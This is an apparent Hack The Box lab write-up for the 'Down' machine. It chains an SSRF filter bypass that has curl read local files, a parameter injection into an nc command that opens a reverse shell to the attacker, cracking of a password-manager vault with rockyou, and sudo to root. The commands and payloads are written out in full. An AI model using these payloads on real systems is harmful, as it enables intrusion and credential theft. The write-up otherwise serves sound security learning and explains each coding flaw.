# **HackTheBox — Down | Full Writeup**

> **Platform:** Hack The Box
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Web / Linux
> **Date:** March 12, 2026

---

## TL;DR

Discovered a verbose SSRF vulnerability on an "Is it down?" web checker. The app used system `curl` under the hood, which was exploited by passing two URLs — one to satisfy the `http://` filter, and a `file://` URL to read local files. Read the PHP source to discover a hidden `?expertmode=tcp` feature running `nc`. Exploited a parameter injection bug in the port field (validate-one-use-another) to get a reverse shell as `www-data`. Found a `pswm` password manager vault in aleks' home directory, brute-forced the master password, decrypted credentials, SSH'd in, and escalated to root via `sudo`.

---

## Attack Chain

```
[Recon]
  nmap → ports 22, 80 only
  ffuf dir/vhost → nothing interesting externally
         │
         ▼
[SSRF Discovery]
  POST url=http://127.0.0.1 → returns full page content
  nc listener → User-Agent: curl/7.81.0 (app uses system curl!)
         │
         ▼
[Protocol Filter Bypass]
  file://, gopher://, php:// → blocked ("Only http or https allowed")
  Regex only checks START of string: preg_match('|^https?://|')
  curl accepts multiple space-separated URLs
  url=http://***REMOVED*** file:///etc/passwd → BOTH fetched!
         │
         ▼
[File Read via Dual URL Trick]
  file:///etc/passwd          → enumerate local users
  file:///proc/self/environ   → app runs as www-data from /var/www/html
  file:///proc/self/cwd/index.php → full PHP source code leaked
         │
         ▼
[Source Code Analysis]
  Hidden GET param: ?expertmode=tcp
  Reveals nc-based TCP checker form (ip + port fields)
  BUG: validates intval($port) but uses original $port in command
  escapeshellcmd() blocks shell injection but NOT parameter injection
         │
         ▼
[Parameter Injection → RCE]
  POST /index.php?expertmode=tcp
  ip=<ATTACKER_IP>&port=<PORT> -e /bin/bash
  Server executes: /usr/bin/nc -vz <ATTACKER_IP> <PORT> -e /bin/bash
  → Reverse shell as www-data
         │
         ▼
[User Flag]
  Found in /var/www/html/
         │
         ▼
[Privesc: www-data → aleks]
  find /home/aleks/.local -type f
  → pswm password manager vault discovered
  Brute-force master password with rockyou.txt
  Decrypt vault → aleks credentials
  ssh aleks@<TARGET>
         │
         ▼
[Privesc: aleks → root]
  .sudo_as_admin_successful → aleks has full sudo
  sudo su → root
```

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [Web Reconnaissance](#web-reconnaissance)
3. [SSRF Discovery & Exploitation](#ssrf-discovery--exploitation)
4. [Filter Bypass — File Read via Dual URL Trick](#filter-bypass--file-read-via-dual-url-trick)
5. [Source Code Analysis](#source-code-analysis)
6. [Parameter Injection → Reverse Shell](#parameter-injection--reverse-shell)
7. [Privilege Escalation — www-data → aleks](#privilege-escalation--www-data--aleks)
8. [Privilege Escalation — aleks → root](#privilege-escalation--aleks--root)
9. [Key Takeaways](#key-takeaways)

---

## Enumeration

### Port Scan

```bash
nmap -sV -sC -Pn 10.129.234.87 -oN initial_scan.txt
```

**Results:**

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.9p1 (Ubuntu) |
| 80/tcp | HTTP | Apache 2.4.52 (Ubuntu) |

Only two ports open — the entire attack surface is the web application on port 80.

```bash
# Full port scan to confirm nothing is hidden externally
nmap -p- --min-rate 5000 -T4 -Pn 10.129.234.87 -oN full_ports.txt
# Result: Only 22 and 80 confirmed
```

### Add Hostname

```bash
echo "10.129.234.87  down.htb" | sudo tee -a /etc/hosts
```

---

## Web Reconnaissance

### Directory Fuzzing

```bash
ffuf -u http://down.htb/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,403 -t 50
```

**Results:**

| Path | Status |
| --- | --- |
| index.php | 200 |
| javascript/ | 301 (403 when accessed) |
| .htpasswd | 403 |
| server-status | 403 |

### Vhost Fuzzing

```bash
# Get baseline response size first
curl -si -H "Host: nonexistent.down.htb" http://10.129.234.87 | grep Content-Length
# Content-Length: 739

ffuf -u http://10.129.234.87 \
  -H "Host: FUZZ.down.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,301,302,403 -fs 739 -t 50
# No vhosts found
```

### Tech Fingerprint

```bash
whatweb http://down.htb/index.php
# Apache 2.4.52, PHP, Ubuntu Linux
```

**Page title:** *"Is it down or just me?"* — a URL availability checker. The moment you see a service that makes outbound HTTP requests on behalf of the user, SSRF should be the first thing you test.

---

## SSRF Discovery & Exploitation

### Identifying SSRF

The application accepts a URL via POST and checks whether it's reachable. Submitting `http://127.0.0.1` returned the full page content:

```bash
curl -s -X POST \
  -d "url=http://127.0.0.1" \
  http://down.htb/index.php
# Response: "It is up. It's just you!" + full HTML of the app
```

**Thought process:** This isn't just port-open confirmation — the app returns the **full response body**. That distinction matters enormously. Verbose SSRF can be used to read content from internal services, not just probe whether they're alive.

### Confirming the App Uses System curl

The most important step before trying any bypass: catch the raw request to understand exactly what technology is making the outbound call.

```bash
# Terminal 1 — listener
nc -lvnp 8889

# Terminal 2 — trigger SSRF toward our listener
curl -s -X POST \
  -d "url=http://***REMOVED***:8889/" \
  http://down.htb/index.php
```

**Captured request:**

```
GET / HTTP/1.1
Host: ***REMOVED***:8889
User-Agent: curl/7.81.0
Accept: */*
```

**Thought process:** `User-Agent: curl/7.81.0` tells us everything. The backend is not using PHP's cURL library (`libcurl`) — it's calling the system `curl` binary directly via `exec()` or `shell_exec()`. This is critical because:

- System curl accepts **multiple space-separated URLs** in one call
- System curl supports the `file://` scheme for local filesystem access
- If input reaches the shell unsanitized, there may be injection opportunities

### Internal Port Discovery

With verbose SSRF confirmed, map internal services using response size as a signal:

- **836 bytes** → "It is down for everyone" (port closed or no HTTP response)
- **>836 bytes** → port returned actual content
- **Internal server error** → port open but non-HTTP protocol

```bash
for p in $(seq 1 65535); do
  size=$(curl -s -o /dev/null -w "%{size_download}" -X POST \
    -d "url=http://127.0.0.1:$p" \
    http://10.129.234.87/index.php)
  [ "$size" -gt "836" ] && echo "OPEN: $p (size: $size)"
done
```

Only port 80 returned actual HTTP content via SSRF.

---

## Filter Bypass — File Read via Dual URL Trick

### Understanding the Filter

Testing alternate protocols hits a whitelist immediately:

```bash
curl -s -X POST -d "url=file:///etc/passwd" http://down.htb/index.php
# "Only protocols http or https allowed."
```

**Thought process:** Don't accept a blocked protocol at face value — understand *how* the filter checks. Is it validating the full URL, or just the prefix? Test progressively:

```
file:///etc/passwd          → blocked
http://file:///etc/passwd   → blocked  
http:// file:///etc/passwd  → ???
```

The key question: does the check use `preg_match('|^https?://|', $url)`? If so, it only validates the **start** of the string. A space after `http://` would satisfy the regex while leaving everything after it unchecked.

### The Dual URL Trick

`curl` processes all space-separated arguments as separate URLs and fetches them sequentially. By placing a dummy `http://` URL first, the regex check passes — then curl happily fetches the `file://` URL as the second target:

```bash
# Curl's actual behavior with two URLs:
curl http://attacker-ip file:///etc/passwd
# → GETs attacker-ip (satisfies regex), then reads /etc/passwd locally
```

**Sending via SSRF:**

```bash
curl -s -X POST \
  --data-urlencode "url=http://***REMOVED*** file:///etc/passwd" \
  http://10.129.234.87/index.php
```

**Result:** `/etc/passwd` contents returned in the response — local file read confirmed.

**Key finding from `/etc/passwd`:** One real user with a login shell — enumerate their home directory next.

### Reading Environment Variables

```bash
curl 'http://10.129.234.87/index.php' \
  -d 'url=http:// file:///proc/self/environ' -s \
  | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p' | tr '\000' '\n'
```

Confirms the app runs as `www-data` from `/var/www/html` — establishes where to look for source files.

---

## Source Code Analysis

### Reading the App Source via /proc/self/cwd

`/proc/self/cwd` is a Linux symlink pointing to the current process's working directory. Since Apache serves from `/var/www/html`, this gives us source without needing the absolute path:

```bash
curl -s -X POST \
  -d 'url=http:// file:///proc/self/cwd/index.php' \
  http://10.129.234.87/index.php \
  | sed -n 's:.*<pre>\(.*\)</pre>.*:\1:p'
```

**Thought process:** Reading source code is always worth doing when you have file read. You cannot discover hidden GET parameters, logic bugs, or hardcoded values from black-box testing alone. The source tells you exactly what the app does.

### Discovering the Hidden expertmode Feature

Inside the source, an `if` branch checking a GET parameter that's completely invisible externally:

```php
if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
  echo '<h1>Is the port refused, or is it just you?</h1>
        <form id="urlForm" action="index.php?expertmode=tcp" method="POST">
            <input type="text" id="url" name="ip" placeholder="Please enter an IP." required><br>
            <input type="number" id="port" name="port" placeholder="Please enter a port number." required><br>
            <button type="submit">Is it refused?</button>
        </form>';
}
```

Accessing `http://down.htb/index.php?expertmode=tcp` reveals a second form — a TCP port checker that accepts an IP and port, and runs `nc` internally.

### The Vulnerability — Validate-One-Use-Another

The expertmode handler code:

```php
$ip = trim($_POST['ip']);
$valid_ip = filter_var($ip, FILTER_VALIDATE_IP);           // validates IP ✅

$port = trim($_POST['port']);
$port_int = intval($port);                                  // "443 -e /bin/bash" → 443
$valid_port = filter_var($port_int, FILTER_VALIDATE_INT);  // validates 443 ✅

if ( $valid_ip && $valid_port ) {
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");     // uses $port, NOT $port_int ← BUG
    exec($ec . " 2>&1", $output, $rc);
}
```

**The bug:** `intval()` extracts only the leading integer from a string — so `"443 -e /bin/bash"` becomes `443`, which passes `FILTER_VALIDATE_INT`. But the **original unmodified string** is what gets inserted into the `nc` command.

**Why `escapeshellcmd` doesn't help:** It escapes shell metacharacters like `;`, `|`, `&&` — preventing the shell from interpreting injected commands. But `-e /bin/bash` contains no metacharacters. It's a clean flag passed directly to `nc`. This is **parameter injection** — a different attack class entirely. `escapeshellarg()` on each argument separately would have prevented this; `escapeshellcmd()` on the whole string does not.

---

## Parameter Injection → Reverse Shell

### Setting Up Listener

```bash
nc -lnvp 443
```

### Triggering the Exploit

```bash
curl -s -X POST \
  "http://10.129.234.87/index.php?expertmode=tcp" \
  -d "ip=***REMOVED***&port=443 -e /bin/bash"
```

The server constructs and executes:

```bash
/usr/bin/nc -vz ***REMOVED*** 443 -e /bin/bash
```

**Shell received as `www-data`.**

### Upgrading the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### User Flag

Found in `/var/www/html/` — look for the `.txt` file with an unusual name.

---

## Privilege Escalation — www-data → aleks

### Enumerating the Target User's Home Directory

```bash
ls -la /home/aleks/
```

**Notable findings:**

| File/Dir | Permissions | Significance |
| --- | --- | --- |
| `.ssh/` | drwx------ | SSH keys — not readable as www-data |
| `.sudo_as_admin_successful` | -rw-r--r-- | aleks has previously used sudo |
| `.local/` | drwxrwxr-x | World-writable — investigate further |
| `.bash_history` | → /dev/null | History deliberately wiped |

**Thought process:** `.sudo_as_admin_successful` is a file Ubuntu creates after a user successfully authenticates with sudo for the first time. Its presence means that if we can get to aleks, root is likely one `sudo su` away. The world-writable `.local` directory is also worth investigating for anything stored there.

### Discovering the Password Manager Vault

```bash
find /home/aleks/.local/ -type f 2>/dev/null
# /home/aleks/.local/share/pswm/pswm
```

`pswm` is a Python CLI password manager ([github.com/Julynx/pswm](https://github.com/Julynx/pswm)). It stores credentials AES-encrypted with a master password. The vault format is `ciphertext*iv*salt*tag`.

**Thought process:** A password manager vault is a high-value target. The AES encryption itself is unbreakable — but master passwords are chosen by humans. If the master password is in `rockyou.txt`, the vault opens. The file is world-readable, so we can exfiltrate it and crack offline with no lockout risk.

### Brute-Forcing the Master Password

Use [pswm-decryptor](https://github.com/seriotonctf/pswm-decryptor) on Kali:

```bash
git clone https://github.com/seriotonctf/pswm-decryptor
cd pswm-decryptor
python3 -m venv venv && source venv/bin/activate
pip3 install cryptocode prettytable

# Save the vault contents (copy from the target)
echo '<VAULT_CONTENTS>' > pswm_vault

# Brute-force with rockyou
python3 pswm-decrypt.py -f pswm_vault -w /usr/share/wordlists/rockyou.txt
```

The tool tries each password from the wordlist as the master key and attempts decryption — if the output is valid plaintext, the master password is found and all stored credentials are displayed in a table.

### SSH as aleks

```bash
ssh aleks@10.129.234.87
# Use the password found in the decrypted vault
```

---

## Privilege Escalation — aleks → root

### Checking sudo Permissions

```bash
sudo -l
```

**Thought process:** The `.sudo_as_admin_successful` file already signaled this — on Ubuntu, users in the `sudo` group receive `(ALL:ALL) ALL` permissions. Confirm with `sudo -l` and escalate immediately.

### Root

```bash
sudo su
cat /root/root.txt
```

---

## Key Takeaways

**1. Verbose SSRF is significantly more dangerous than blind SSRF**
When the app returns the full response body, SSRF becomes a file reader, internal service enumerator, and RCE stepping stone — not just a port scanner.

**2. Always catch the outbound request on a listener**
`User-Agent: curl/7.81.0` immediately revealed the implementation. Assuming how SSRF works wastes time — always intercept it first.

**3. Understand the filter before bypassing it**
Testing `file://` alone and then systematically probing `http:// file://` revealed that the regex only validated the string's start. Boundary testing exposes the exact gap.

**4. Source code reveals what black-box cannot**
The `?expertmode=tcp` feature was entirely invisible externally. No fuzzer would find a hidden GET parameter. File read → source code → hidden functionality is a chain that compounds each primitive into something more powerful.

**5. Validate-one-use-another is a critical logic bug**
Sanitizing one variable and then using the original in the dangerous operation is a subtle developer mistake. Always verify that the validated value is the one actually used downstream.

**6. Parameter injection ≠ shell injection**
`escapeshellcmd` on the full string neutralizes metacharacters but cannot prevent passing extra flags to the binary. `escapeshellarg` on each individual argument separately would have prevented this. These are two distinct attack classes.

**7. Password manager vaults are offline crackable**
World-readable vault files can be exfiltrated and brute-forced without rate limits or lockouts. Encryption strength is irrelevant if the master password is weak.

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port scanning and service enumeration |
| `ffuf` | Directory and vhost fuzzing |
| `curl` | Manual HTTP requests and SSRF testing |
| `netcat` | Listener for request capture and reverse shell |
| `whatweb` | Web technology fingerprinting |
| `pswm-decryptor` | Brute-force pswm master password and decrypt vault |
| `rockyou.txt` | Wordlist for password cracking |

---

*Written by k41r0s3 | HackTheBox | Down*
